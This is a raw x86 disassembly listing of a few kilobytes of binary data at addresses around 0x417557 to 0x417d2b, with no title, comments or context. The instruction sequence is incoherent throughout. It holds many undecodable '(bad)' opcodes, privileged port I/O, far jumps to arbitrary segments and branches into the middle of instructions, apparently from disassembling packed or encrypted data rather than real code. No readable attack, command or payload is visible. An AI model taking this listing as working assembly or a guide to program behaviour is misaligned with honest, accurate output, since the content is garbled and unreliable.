  417557:	lds    edx,FWORD PTR [ebp+0x6d]
  41755a:	sub    ebp,eax
  41755c:	sbb    DWORD PTR [ebp+0x5aa91a91],0xffffffdd
  417563:	sub    al,0x45
  417565:	cs in  al,dx
  417567:	retf   
  417568:	mov    edi,0xa245e98e
  41756d:	add    dh,BYTE PTR [esi+0x275d8c12]
  417573:	and    DWORD PTR [esi-0x73ee7e57],edx
  417579:	bound  ebp,QWORD PTR [edx+0x75]
  41757c:	arpl   WORD PTR [ecx],dx
  41757e:	and    al,0x28
  417580:	inc    eax
  417581:	mov    ecx,0xc6b5028
  417586:	mov    ebp,DWORD PTR [edx+eax*8]
  417589:	sub    cl,BYTE PTR fs:[edi+ebp*4+0x36]
  41758e:	inc    esi
  41758f:	sub    DWORD PTR [eax-0x3176add6],esp
  417595:	shl    DWORD PTR [edx+ebx*4+0x2688aa57],1
  41759c:	mov    ds:0x45b570ce,al
  4175a1:	int3   
  4175a2:	fs je  0x41756a
  4175a5:	mov    bh,0xb0
  4175a7:	int3   
  4175a8:	and    esi,DWORD PTR [edx]
  4175aa:	mov    eax,0x55f6c593
  4175af:	in     eax,0x4c
  4175b1:	pop    ecx
  4175b2:	push   0xffffffe2
  4175b4:	mov    ah,0x7a
  4175b6:	add    ah,BYTE PTR [eax]
  4175b8:	std    
  4175b9:	adc    edx,DWORD PTR [ecx+0x3a]
  4175bc:	xlat   BYTE PTR ds:[ebx]
  4175bd:	pusha  
  4175be:	jno    0x41754e
  4175c0:	xor    DWORD PTR [esi],edx
  4175c2:	lock and eax,DWORD PTR [edi]
  4175c5:	cmp    DWORD PTR [eax-0x62],eax
  4175c8:	ins    BYTE PTR es:[edi],dx
  4175c9:	test   DWORD PTR [ebx-0x5487a78e],ecx
  4175cf:	test   BYTE PTR [ebx+0x65e0dd68],bl
  4175d5:	sub    DWORD PTR [edi],ecx
  4175d7:	aad    0x31
  4175d9:	in     al,dx
  4175da:	out    dx,eax
  4175db:	fadd   DWORD PTR [ebp+0x2ad881e8]
  4175e1:	(bad)  
  4175e2:	(bad)  
  4175e4:	and    BYTE PTR [edx-0x15],dl
  4175e7:	scas   eax,DWORD PTR es:[edi]
  4175e8:	inc    edi
  4175e9:	fld    TBYTE PTR ds:[ebx+0x4a]
  4175ed:	scas   al,BYTE PTR es:[edi]
  4175ee:	enter  0x881b,0xa3
  4175f2:	stc    
  4175f3:	les    edx,FWORD PTR [bx-0x47]
  4175f7:	out    dx,al
  4175f8:	push   esp
  4175f9:	xor    eax,0x8bf761c7
  4175fe:	pop    es
  4175ff:	jne    0x41762d
  417601:	jns    0x41761e
  417603:	pop    ebx
  417604:	adc    ebx,0xffffff87
  417607:	fidivr DWORD PTR [ebp+esi*2+0x170d10d3]
  41760e:	push   0x2f
  417610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417611:	fnstenv [ecx+edx*4-0x32865748]
  417618:	dec    edx
  417619:	xor    ecx,DWORD PTR [edi+eiz*8+0x7f5386a9]
  417620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417621:	mov    ch,0xf5
  417623:	cmc    
  417624:	(bad)  [esi-0x6f7f17d1]
  41762a:	lea    ecx,ds:0x3ee2bb0a
  417630:	cmp    ch,ah
  417632:	inc    edx
  417633:	inc    edi
  417634:	icebp  
  417635:	mov    BYTE PTR [edx],cl
  417637:	pop    es
  417638:	sti    
  417639:	fstp   TBYTE PTR [esi+ebp*8]
  41763c:	and    BYTE PTR [edx+edi*1-0x31fb7c88],bh
  417643:	push   eax
  417644:	cmp    eax,0xb29646e7
  417649:	(bad)  
  41764a:	or     al,0x33
  41764c:	or     ah,BYTE PTR [edx+0xc9e8fe8]
  417652:	push   eax
  417653:	push   es
  417654:	ins    DWORD PTR es:[edi],dx
  417655:	mov    bh,0x99
  417657:	dec    ebx
  417658:	push   0xd9e5b24b
  41765d:	mov    edx,0xc6d815e
  417662:	rcl    BYTE PTR [ebx-0x2b0cb0c9],1
  417668:	test   DWORD PTR [edx],ebx
  41766a:	or     al,0x84
  41766c:	in     al,0xdd
  41766e:	xor    eax,0x84b9b077
  417673:	pushf  
  417674:	dec    edx
  417675:	jo     0x4176de
  417677:	test   eax,0xc2a83159
  41767c:	push   ebp
  41767d:	mov    cl,0x71
  41767f:	arpl   WORD PTR [ecx+esi*2-0x42],di
  417683:	bound  edx,QWORD PTR [edx-0x2f41f897]
  417689:	push   edi
  41768a:	xchg   edi,eax
  41768b:	jg     0x4176d0
  41768d:	pop    edi
  41768e:	cmp    eax,0x5c8afae8
  417693:	adc    eax,0x8e8ea928
  417698:	or     eax,0x959f7681
  41769d:	pusha  
  41769e:	retf   
  41769f:	psubusb mm7,QWORD PTR [ecx+0x4fdc904f]
  4176a6:	shl    BYTE PTR [edi],cl
  4176a8:	scas   eax,DWORD PTR es:[edi]
  4176a9:	sub    dh,BYTE PTR [ecx-0x80]
  4176ac:	jle    0x4176dc
  4176ae:	dec    ebx
  4176af:	sbb    DWORD PTR [eax+0x33a0bd03],edx
  4176b5:	in     eax,0x87
  4176b7:	mov    bh,0x69
  4176b9:	(bad)  
  4176ba:	cs push ss
  4176bc:	xchg   esi,eax
  4176bd:	ret    0xa1ca
  4176c0:	sub    eax,DWORD PTR [eax+0x63]
  4176c3:	call   0xd695:0xb0a6dae5
  4176ca:	scas   eax,DWORD PTR es:[edi]
  4176cb:	sar    BYTE PTR [ebp+0x71],1
  4176ce:	cmp    eax,0x3178ed62
  4176d3:	int    0xe0
  4176d5:	aaa    
  4176d6:	push   eax
  4176d7:	ret    0x482a
  4176da:	dec    ebp
  4176db:	mov    cl,0xe4
  4176dd:	xchg   esp,eax
  4176de:	cmovno esp,DWORD PTR ds:0x3d59321d
  4176e5:	ja     0x41768a
  4176e7:	fmul   QWORD PTR [esi-0x2f]
  4176ea:	mov    ebp,0x78a272a6
  4176ef:	vsubpd xmm5,xmm6,xmm7
  4176f3:	and    eax,0x7f846549
  4176f8:	cmp    bh,ah
  4176fa:	mov    eax,0x789cfae3
  4176ff:	je     0x4176d5
  417701:	xor    dl,dh
  417703:	add    DWORD PTR [ebx],esp
  417705:	and    esp,DWORD PTR [ebp-0xa]
  417708:	fdivrp st(3),st
  41770a:	je     0x41769e
  41770c:	add    al,0xa6
  41770e:	inc    ebp
  41770f:	cli    
  417710:	mov    ebp,ebx
  417712:	mov    dh,0x77
  417714:	sbb    al,0xd9
  417716:	mov    bh,0xb5
  417718:	and    bh,BYTE PTR [esi]
  41771a:	jl     0x417724
  41771c:	(bad)
  41771f:	test   eax,0xd86549f0
  417724:	pusha  
  417725:	lea    edx,[ecx+0x39]
  417728:	cmc    
  417729:	push   ss
  41772a:	(bad)  
  41772b:	or     eax,0xd4c1c3ba
  417730:	fiadd  WORD PTR [esi+eiz*2-0x7eca0bd0]
  417737:	push   0x6e895bfd
  41773c:	test   eax,0x2fc689d2
  417741:	or     bh,BYTE PTR [ebx+eiz*2]
  417744:	add    BYTE PTR [ebp-0x5b5e9998],ch
  41774a:	ss push ecx
  41774c:	jmp    0x6a0ea641
  417751:	neg    DWORD PTR [ecx+0x1b]
  417754:	push   ebx
  417755:	mov    ah,BYTE PTR [ebx]
  417757:	sbb    bl,al
  417759:	dec    edx
  41775a:	push   edi
  41775b:	ret    0x307d
  41775e:	push   ebx
  41775f:	out    0x3d,al
  417761:	(bad)  
  417762:	jne    0x4176fe
  417764:	lea    ecx,[eax+ecx*4+0x1c]
  417768:	fidivr WORD PTR [esi+0x39]
  41776b:	pop    ds
  41776c:	cmp    edi,DWORD PTR [ecx+eax*2+0xe]
  417770:	ret    
  417771:	cmp    al,0xb0
  417773:	push   eax
  417774:	or     DWORD PTR [edi],0xfffffff9
  417777:	lods   al,BYTE PTR ds:[esi]
  417778:	out    0xbe,eax
  41777a:	cld    
  41777b:	jmp    0x11df:0x1cdb4728
  417782:	sbb    edx,DWORD PTR [esi+edi*8+0x37]
  417786:	xchg   ebx,eax
  417787:	adc    eax,0x8df4bc26
  41778c:	dec    esp
  41778d:	xchg   ecx,eax
  41778e:	popf   
  41778f:	(bad)  
  417791:	adc    eax,0xcf33cc98
  417796:	sub    DWORD PTR [eax+0x1f],0xc
  41779a:	cmc    
  41779b:	push   esi
  41779c:	sub    dl,BYTE PTR [eax]
  41779e:	pop    ss
  41779f:	int    0x23
  4177a1:	inc    esi
  4177a2:	aaa    
  4177a3:	stos   BYTE PTR es:[edi],al
  4177a4:	cmp    al,0x6c
  4177a6:	in     al,dx
  4177a7:	jbe    0x417793
  4177a9:	sti    
  4177aa:	fwait
  4177ab:	adc    ah,BYTE PTR [ecx+eax*2+0x5c]
  4177af:	push   ebx
  4177b0:	gs loop 0x41774d
  4177b3:	sbb    DWORD PTR [edx-0x35],0x7f
  4177b7:	mov    al,ds:0x25e0e828
  4177bc:	shr    DWORD PTR [eax-0x80],0xc7
  4177c0:	xchg   DWORD PTR [ebx],esi
  4177c2:	cmc    
  4177c3:	pop    esi
  4177c4:	iret   
  4177c5:	popf   
  4177c6:	mov    ds:0xf8853a29,eax
  4177cb:	push   edi
  4177cc:	ja     0x417823
  4177ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177cf:	repnz sbb BYTE PTR [edx+edx*4],dl
  4177d3:	scas   al,BYTE PTR es:[edi]
  4177d4:	out    dx,al
  4177d5:	aaa    
  4177d6:	inc    ebx
  4177d7:	leave  
  4177d8:	inc    esi
  4177d9:	cs mov bl,0x92
  4177dc:	xchg   esi,eax
  4177dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177de:	mov    ebx,0xcfaabe2a
  4177e3:	out    0xf5,al
  4177e5:	daa    
  4177e6:	mov    al,ds:0x1ad20969
  4177eb:	(bad)
  4177ef:	push   esi
  4177f0:	sahf   
  4177f1:	(bad)  
  4177f2:	sbb    edi,DWORD PTR [edx-0x4335a9b4]
  4177f8:	xchg   esp,eax
  4177f9:	shufps xmm3,XMMWORD PTR [ecx-0x28],0x35
  4177fe:	pusha  
  4177ff:	adc    DWORD PTR [edx],esi
  417801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417802:	jge    0x4177f0
  417804:	addr16 pop esp
  417806:	dec    edi
  417807:	mov    dh,0x76
  417809:	fisub  WORD PTR [esi-0x35]
  41780c:	mov    edx,DWORD PTR [esi+0x471c22c5]
  417812:	add    BYTE PTR [edx+0x67dafc0b],ch
  417818:	pop    esp
  417819:	xchg   ecx,eax
  41781a:	loopne 0x417819
  41781c:	fnstsw WORD PTR [eax-0x2b]
  41781f:	in     eax,0xfc
  417821:	sub    BYTE PTR [edi+eax*2+0x327ab4c2],cl
  417828:	int    0xa1
  41782a:	dec    edx
  41782b:	nop    eax
  41782e:	or     DWORD PTR [esi-0x5a],edi
  417831:	cwde   
  417832:	cmp    esi,esi
  417834:	push   ebx
  417835:	jmp    0xb527:0x8ebe803b
  41783c:	addps  xmm4,xmm7
  41783f:	jae    0x4177c5
  417841:	mov    cl,BYTE PTR [ebp+0x78]
  417844:	fistp  WORD PTR [edi-0x5b]
  417847:	fdivr  st(2),st
  417849:	dec    DWORD PTR [ebx+ebp*4]
  41784c:	inc    eax
  41784d:	cmp    ch,cl
  41784f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417850:	mov    ds:0x57380d52,eax
  417855:	in     eax,dx
  417856:	in     al,dx
  417857:	push   eax
  417858:	data16 aas 
  41785a:	out    dx,al
  41785b:	inc    esi
  41785c:	in     al,dx
  41785d:	inc    edi
  41785e:	loopne 0x4177f7
  417860:	loop   0x417826
  417862:	out    0x43,eax
  417864:	or     al,0xd
  417866:	sbb    ch,BYTE PTR [eax]
  417868:	and    esp,DWORD PTR [esi+0x36]
  41786b:	mov    ch,0xab
  41786d:	inc    edx
  41786e:	cmp    DWORD PTR [ebp-0x48],0x59
  417872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417873:	pop    edx
  417874:	mov    bl,0xa8
  417876:	jmp    0x4177fb
  417878:	jbe    0x417844
  41787a:	mov    ecx,0xca5f07e8
  41787f:	xchg   esp,eax
  417880:	mov    eax,0x9ed6fee3
  417885:	xor    bl,BYTE PTR [edx+0x1502e633]
  41788b:	mov    ch,0xe8
  41788d:	lods   al,BYTE PTR ds:[esi]
  41788e:	outs   dx,BYTE PTR ds:[esi]
  41788f:	lea    esp,[ebx-0x57351fdb]
  417895:	mov    edi,0xea6ee8ee
  41789a:	sub    DWORD PTR fs:[ecx+0x4e],ecx
  41789e:	cmp    DWORD PTR [edi],ebx
  4178a0:	push   es
  4178a1:	or     eax,0x4d843821
  4178a6:	popa   
  4178a7:	push   eax
  4178a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178a9:	mov    al,0x6f
  4178ab:	sbb    BYTE PTR [edx-0x3a],bl
  4178ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178af:	(bad)  
  4178b0:	outs   dx,BYTE PTR ds:[esi]
  4178b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178b2:	jo     0x417867
  4178b4:	jmp    0x417911
  4178b6:	test   eax,0x71a0bc12
  4178bb:	lods   al,BYTE PTR ds:[esi]
  4178bc:	dec    ebx
  4178bd:	shr    eax,0x57
  4178c0:	cmp    al,0xe1
  4178c2:	jmp    0x3e95:0x631b0aec
  4178c9:	cmc    
  4178ca:	repz dec BYTE PTR [ecx+edi*4-0x3a063137]
  4178d2:	sbb    cl,BYTE PTR [edi]
  4178d4:	pop    eax
  4178d5:	jns    0x4178b2
  4178d7:	sbb    eax,edi
  4178d9:	sbb    cl,ch
  4178db:	inc    ebp
  4178dc:	mov    edx,0x9e534a91
  4178e1:	je     0x417882
  4178e3:	call   DWORD PTR [ebx-0x6c]
  4178e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178e7:	pop    edx
  4178e8:	push   esp
  4178e9:	push   esp
  4178ea:	clc    
  4178eb:	mov    bh,0x35
  4178ed:	jl     0x417908
  4178ef:	inc    ecx
  4178f0:	out    dx,al
  4178f1:	adc    bh,cl
  4178f3:	mov    ebp,DWORD PTR [edi+ebx*8]
  4178f6:	or     eax,0xe939de6a
  4178fb:	iret   
  4178fc:	xchg   esi,eax
  4178fd:	xchg   DWORD PTR [ebp+0x4c57dccb],esp
  417903:	out    0xec,eax
  417905:	pushf  
  417906:	or     ch,BYTE PTR [esi-0x62]
  417909:	dec    ebx
  41790a:	out    0xb,al
  41790c:	mov    bl,0x1b
  41790e:	ins    BYTE PTR es:[edi],dx
  41790f:	adc    ah,BYTE PTR [ebx-0x14]
  417912:	add    edx,DWORD PTR [ebx+0x7af2ef6a]
  417918:	dec    ebp
  417919:	pop    ebp
  41791a:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41791c:	cmp    ah,BYTE PTR [eax-0x24cc070a]
  417922:	xchg   edx,eax
  417923:	test   ebp,ebx
  417925:	fldcw  WORD PTR [ecx+0x7ff78124]
  41792b:	mov    ah,0x53
  41792d:	inc    DWORD PTR [eax-0x6b011982]
  417933:	mov    dl,0x47
  417935:	adc    al,0xa9
  417937:	(bad)  
  417938:	repnz pop eax
  41793a:	mov    al,0xe2
  41793c:	in     eax,0x92
  41793e:	sub    edx,DWORD PTR [ebp-0xe]
  417941:	aam    0x5f
  417943:	sar    BYTE PTR [edi-0x6f934c0c],cl
  417949:	je     0x417976
  41794b:	div    BYTE PTR [ecx-0x569a8aa8]
  417951:	cmp    al,0x4d
  417953:	je     0x417993
  417955:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  417957:	out    0xe0,al
  417959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41795a:	ror    BYTE PTR [edx+ebx*8],cl
  41795d:	addr16 dec esp
  41795f:	js     0x417932
  417961:	sub    eax,0x18a0f80
  417966:	cmp    eax,0x7fb4fbe6
  41796b:	adc    DWORD PTR [edi+0x73],esi
  41796e:	jmp    0x417997
  417970:	xor    eax,0xe7db14fb
  417975:	pop    esi
  417976:	jno    0x4179a2
  417978:	test   BYTE PTR [eax-0x7be539d0],al
  41797e:	and    ch,BYTE PTR [edi-0x112d224c]
  417984:	sbb    ebx,DWORD PTR [ebx]
  417986:	sub    DWORD PTR [eax-0x153f7325],0xffffff9d
  41798d:	jb     0x417983
  41798f:	test   al,0x3d
  417991:	push   edx
  417992:	sub    DWORD PTR [edi+0x50],esi
  417995:	xor    ch,BYTE PTR [edx-0x3e]
  417998:	repz jnp 0x41794f
  41799b:	ss inc ebx
  41799d:	sbb    ah,BYTE PTR [esp+edx*8]
  4179a0:	std    
  4179a1:	sbb    eax,0x3f94cfff
  4179a6:	inc    ebx
  4179a7:	and    ecx,DWORD PTR [eax-0x1f63389]
  4179ad:	add    ah,BYTE PTR [edi]
  4179af:	js     0x41793e
  4179b1:	sbb    al,0xf9
  4179b3:	and    DWORD PTR [esi+0x55ba6e23],edx
  4179b9:	dec    ebx
  4179ba:	inc    esp
  4179bb:	in     eax,0xc6
  4179bd:	lock mov fs,WORD PTR [esi-0xd]
  4179c1:	sub    bh,bl
  4179c3:	leave  
  4179c4:	fimul  WORD PTR [ebx+0x43]
  4179c7:	dec    edi
  4179c8:	sub    eax,esi
  4179ca:	repnz loop 0x4179ba
  4179cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179ce:	loop   0x417972
  4179d0:	hlt    
  4179d1:	inc    eax
  4179d2:	push   cs
  4179d3:	xchg   ebp,eax
  4179d4:	fild   DWORD PTR [eax-0x4d]
  4179d7:	mov    ebx,DWORD PTR [ebx-0x1098662d]
  4179dd:	mov    ds:0x50e7713e,eax
  4179e2:	cli    
  4179e3:	cld    
  4179e4:	push   esp
  4179e5:	jmp    edi
  4179e7:	in     eax,dx
  4179e8:	sub    al,0xe5
  4179ea:	mov    edi,0x89bef7ca
  4179ef:	xchg   ecx,eax
  4179f0:	inc    esi
  4179f1:	xchg   BYTE PTR [ebp-0x77296fad],dh
  4179f7:	stos   DWORD PTR es:[edi],eax
  4179f8:	repz inc esi
  4179fa:	sbb    ecx,DWORD PTR [eax+ecx*2]
  4179fd:	mov    bl,0xd0
  4179ff:	mov    esi,0x4e87b844
  417a04:	test   DWORD PTR ds:0xc10ecbbb,0x1e776014
  417a0e:	fbld   TBYTE PTR [ebx-0x60]
  417a11:	jp     0x4179a8
  417a13:	mov    ds:0x56639595,eax
  417a18:	aaa    
  417a19:	repnz fidiv DWORD PTR ds:0x5417a9d
  417a20:	in     eax,0xb1
  417a22:	test   eax,0xb6b3e54b
  417a27:	test   ecx,ebp
  417a29:	inc    ecx
  417a2a:	aas    
  417a2b:	mov    eax,0x40d95dfe
  417a30:	pop    esi
  417a31:	dec    edx
  417a32:	xor    DWORD PTR [ecx],edx
  417a34:	imul   esi,DWORD PTR [edi],0x66bde280
  417a3a:	cwde   
  417a3b:	jl     0x4179db
  417a3d:	or     al,0xe2
  417a3f:	std    
  417a40:	and    eax,0xa8384c22
  417a45:	jbe    0x417a40
  417a47:	lods   eax,DWORD PTR ds:[esi]
  417a48:	jl     0x417abd
  417a4a:	rcl    BYTE PTR [edi],1
  417a4c:	lods   eax,DWORD PTR ds:[esi]
  417a4d:	cmp    BYTE PTR [edx-0x22],ch
  417a50:	test   eax,0xc55b3c9
  417a55:	add    BYTE PTR [edi-0x22],dl
  417a58:	loop   0x417abc
  417a5a:	sbb    eax,0xaac99c33
  417a5f:	(bad)  
  417a61:	push   0xb8cfb913
  417a66:	das    
  417a67:	fwait
  417a68:	add    eax,0x42dd5e7e
  417a6d:	push   es
  417a6e:	mov    eax,0x2814c547
  417a73:	sbb    DWORD PTR [ecx-0x4356d2d0],ebp
  417a79:	xor    DWORD PTR [ecx+0x3d4f47c4],eax
  417a7f:	add    BYTE PTR cs:0xc11c88dc,dh
  417a86:	xchg   ebp,esi
  417a88:	iret   
  417a89:	and    BYTE PTR [esi+0x2b23ee8b],bl
  417a8f:	inc    eax
  417a90:	retf   0xeb1f
  417a93:	mov    ds:0x57ed48,eax
  417a98:	iret   
  417a99:	or     al,0xdd
  417a9b:	mov    ecx,0xe2d2352c
  417aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aa1:	and    al,0x69
  417aa3:	stos   DWORD PTR es:[edi],eax
  417aa4:	out    0xfd,eax
  417aa6:	inc    edx
  417aa7:	xor    eax,0x21cfe86e
  417aac:	in     eax,dx
  417aad:	add    al,0x88
  417aaf:	dec    eax
  417ab0:	and    esp,DWORD PTR [esi]
  417ab2:	imul   eax,esi,0x1b
  417ab5:	push   esi
  417ab6:	sub    al,0x10
  417ab8:	mov    esi,0x258d0113
  417abd:	pop    ebp
  417abe:	mov    esi,0xd85846ac
  417ac3:	ss push ebp
  417ac5:	pushf  
  417ac6:	popa   
  417ac7:	sbb    dl,al
  417ac9:	int3   
  417aca:	mov    esp,0xe54ba24c
  417acf:	adc    DWORD PTR ds:0xd8acbb94,0x9c180c66
  417ad9:	pop    ss
  417ada:	mov    ds:0x8dd1c167,eax
  417adf:	jecxz  0x417a75
  417ae1:	xor    esi,edi
  417ae3:	shl    BYTE PTR [edx-0x24745a7e],1
  417ae9:	(bad)  
  417aea:	pop    ds
  417aeb:	cmp    BYTE PTR [edx-0x1d97fc24],0x54
  417af2:	imul   esi,DWORD PTR [ecx],0x7a
  417af5:	sbb    al,0x5f
  417af7:	les    edi,FWORD PTR [esi+0x1a]
  417afa:	retf   
  417afb:	add    eax,0xb24a224c
  417b00:	sub    BYTE PTR [edx-0x20],cl
  417b03:	aam    0x9c
  417b05:	mov    dl,0xd2
  417b07:	(bad)  
  417b08:	push   esi
  417b09:	fwait
  417b0a:	push   edx
  417b0b:	ss mov ah,0x6e
  417b0e:	dec    edi
  417b0f:	mov    bl,0xb8
  417b11:	into   
  417b12:	pop    ebp
  417b13:	add    DWORD PTR [esi+0x69],ebp
  417b16:	inc    esi
  417b17:	lahf   
  417b18:	push   edx
  417b19:	mov    DWORD PTR [eax+edi*1-0x1b578cde],eax
  417b20:	adc    eax,0xd9eccbad
  417b25:	sahf   
  417b26:	sbb    DWORD PTR [esi-0xb],edi
  417b29:	rcl    DWORD PTR [ebx-0x3b],cl
  417b2c:	mov    WORD PTR [ecx+0x1beb43bf],?
  417b32:	loope  0x417b1a
  417b34:	add    ebx,DWORD PTR [ebp+0x3fc6d510]
  417b3a:	sbb    ch,0xb4
  417b3d:	mov    eax,0x9c927392
  417b42:	add    dh,bl
  417b44:	sbb    DWORD PTR [ecx+0x47],0x65a30db9
  417b4b:	xchg   esp,eax
  417b4c:	cmp    cl,BYTE PTR [eax-0x3ff33f75]
  417b52:	push   ebx
  417b53:	add    DWORD PTR [edi],0xdff10c67
  417b59:	add    al,0x8f
  417b5b:	rcr    esp,0x65
  417b5e:	lods   eax,DWORD PTR ds:[esi]
  417b5f:	jne    0x417af5
  417b61:	dec    edx
  417b62:	pop    edi
  417b63:	sub    DWORD PTR [edi],0x2892bd32
  417b69:	ret    
  417b6a:	in     al,0x14
  417b6c:	in     al,0xc6
  417b6e:	mov    ah,0xb4
  417b70:	sti    
  417b71:	or     eax,0xdc514fd5
  417b76:	mov    ah,0x8c
  417b78:	mov    ah,0x75
  417b7a:	adc    BYTE PTR [ebx],dl
  417b7c:	mov    eax,0xd7aabb74
  417b81:	xlat   BYTE PTR ds:[ebx]
  417b82:	ds push ds
  417b84:	test   eax,0x1bb9e5ff
  417b89:	inc    ecx
  417b8a:	and    edi,esp
  417b8c:	xchg   ebx,eax
  417b8d:	inc    esi
  417b8e:	sahf   
  417b8f:	xchg   ch,dh
  417b91:	xchg   ebx,eax
  417b92:	add    ch,bh
  417b94:	std    
  417b95:	mov    ecx,0xff24443d
  417b9a:	std    
  417b9b:	mov    al,0xa2
  417b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b9e:	gs push 0xe2253566
  417ba4:	xchg   ebx,eax
  417ba5:	fwait
  417ba6:	mov    dl,0xe7
  417ba8:	and    al,0x79
  417baa:	leave  
  417bab:	add    bh,cl
  417bad:	pop    esi
  417bae:	(bad)  
  417baf:	aas    
  417bb0:	ret    
  417bb1:	push   edx
  417bb2:	cwde   
  417bb3:	fist   WORD PTR [ebx]
  417bb5:	xor    edx,DWORD PTR [edi]
  417bb7:	mov    esi,0x1c21fb31
  417bbc:	lss    edx,FWORD PTR [ebx+0x1c]
  417bc0:	sbb    ecx,0x880dc60c
  417bc6:	mov    dh,0xeb
  417bc8:	aam    0xc3
  417bca:	pop    ebx
  417bcb:	add    BYTE PTR [ebx],al
  417bcd:	or     eax,0xdfee892b
  417bd2:	retf   
  417bd3:	adc    ebx,DWORD PTR [ebp+0x7b92115e]
  417bd9:	ins    DWORD PTR es:[edi],dx
  417bda:	xchg   DWORD PTR [eax+0x13],ebp
  417bdd:	(bad)  
  417bde:	pop    ebx
  417bdf:	ss in  al,0xce
  417be2:	and    esi,DWORD PTR [eax-0x28]
  417be5:	(bad)  
  417be6:	rol    BYTE PTR [edi+0x610d5532],cl
  417bec:	in     al,0x7a
  417bee:	aam    0x8e
  417bf0:	mov    ebp,DWORD PTR [ebx]
  417bf2:	lahf   
  417bf3:	dec    edx
  417bf4:	jmp    0x417c4d
  417bf6:	cvtpi2ps xmm4,mm5
  417bf9:	sbb    ch,cl
  417bfb:	jmp    0x8f7a:0xd0710128
  417c02:	sti    
  417c03:	lock inc esi
  417c05:	jne    0x417bba
  417c07:	stos   DWORD PTR es:[edi],eax
  417c08:	adc    DWORD PTR [eax],edi
  417c0a:	or     BYTE PTR [ebp-0x469947dd],al
  417c10:	sub    eax,0xe89bd251
  417c15:	popf   
  417c16:	ins    DWORD PTR es:[edi],dx
  417c17:	addr16 inc ecx
  417c19:	fimul  WORD PTR [ebx-0x7b39bf6c]
  417c1f:	in     eax,dx
  417c20:	jmp    0x417c9f
  417c22:	pop    esi
  417c23:	aaa    
  417c24:	in     al,0xb4
  417c26:	jmp    0x6d4db3f4
  417c2b:	cld    
  417c2c:	push   ecx
  417c2d:	pop    ecx
  417c2e:	out    0xc5,al
  417c30:	mov    esi,0x9e431ce9
  417c35:	pop    esp
  417c36:	push   0xffffffca
  417c38:	outs   dx,DWORD PTR ds:[esi]
  417c39:	out    0x89,eax
  417c3b:	adc    BYTE PTR [edx+0x68],0x6d
  417c3f:	xor    ebx,DWORD PTR [edi+ecx*2-0x725be74b]
  417c46:	and    eax,0x2af257dc
  417c4b:	jb     0x417c81
  417c4d:	mov    edi,0x6bf41f94
  417c52:	and    al,0xe0
  417c54:	rcr    WORD PTR [ecx],cl
  417c57:	fiadd  WORD PTR [ecx-0x208031ee]
  417c5d:	lock jne 0x417c70
  417c60:	dec    esp
  417c61:	rcr    DWORD PTR ss:[ebx+0x55b5c984],1
  417c68:	jb     0x417cd4
  417c6a:	jp     0x417c3d
  417c6c:	scas   al,BYTE PTR es:[edi]
  417c6d:	jb     0x417caf
  417c6f:	push   esp
  417c70:	(bad)  
  417c71:	stos   BYTE PTR es:[edi],al
  417c72:	ins    BYTE PTR es:[edi],dx
  417c73:	(bad)  
  417c74:	cwde   
  417c75:	mov    ds:0x80d18367,al
  417c7a:	mov    eax,ds:0x54e37333
  417c7f:	push   es
  417c80:	mov    eax,ds:0xc802a2b3
  417c85:	enter  0xa2a4,0x3e
  417c89:	popa   
  417c8a:	sbb    al,0xa6
  417c8c:	in     eax,dx
  417c8d:	push   ss
  417c8e:	repnz popa 
  417c90:	and    al,0xc3
  417c92:	cmc    
  417c93:	push   esp
  417c94:	or     BYTE PTR [edi-0x46],al
  417c97:	xchg   edx,eax
  417c98:	xchg   ebx,eax
  417c99:	dec    ebx
  417c9a:	or     esi,ebp
  417c9c:	sahf   
  417c9d:	mov    ah,0x23
  417c9f:	les    esp,FWORD PTR [ebp+0x3b334a41]
  417ca5:	mov    cl,0x8a
  417ca7:	js     0x417d08
  417ca9:	stos   BYTE PTR es:[edi],al
  417caa:	lahf   
  417cab:	out    dx,eax
  417cac:	fist   WORD PTR [edx+0x20176ef7]
  417cb2:	adc    ecx,DWORD PTR [edi-0x604a931d]
  417cb8:	mov    eax,0xdc4050c
  417cbd:	call   0x7962:0xabda0710
  417cc4:	call   0xe0fe:0x2e712645
  417ccb:	repz dec ecx
  417ccd:	mov    eax,0x2811cb44
  417cd2:	or     bl,BYTE PTR [eax-0x40]
  417cd5:	push   cs
  417cd6:	jecxz  0x417cb3
  417cd8:	aad    0x85
  417cda:	das    
  417cdb:	inc    edi
  417cdc:	adc    eax,0x8d58d968
  417ce1:	test   DWORD PTR [esi],ecx
  417ce3:	xchg   edx,eax
  417ce4:	addr16 sbb ax,0x912c
  417ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cea:	in     al,dx
  417ceb:	(bad)  
  417cec:	test   al,0x27
  417cee:	in     al,dx
  417cef:	cmp    esp,DWORD PTR [edx-0x55]
  417cf2:	xchg   ecx,eax
  417cf3:	out    dx,eax
  417cf4:	mov    eax,ds:0xbbd6bf3b
  417cf9:	std    
  417cfa:	(bad)  
  417cfb:	jp     0x417d21
  417cfd:	pusha  
  417cfe:	test   eax,0x57f10507
  417d03:	push   edi
  417d04:	pop    ds
  417d05:	fdivr  DWORD PTR ds:0xbf66e886
  417d0b:	jno    0x417d5d
  417d0d:	cmp    eax,0x14815c3c
  417d12:	mov    WORD PTR [ebx+0xe],ss
  417d15:	mov    edi,0x25658c04
  417d1a:	push   0xd258c0ea
  417d1f:	ins    BYTE PTR es:[edi],dx
  417d20:	pop    edx
  417d21:	fisubr WORD PTR [ebx]
  417d23:	rol    DWORD PTR ss:0x8fae4a2a,1
  417d2a:	hlt    
  417d2b:	pop    eax
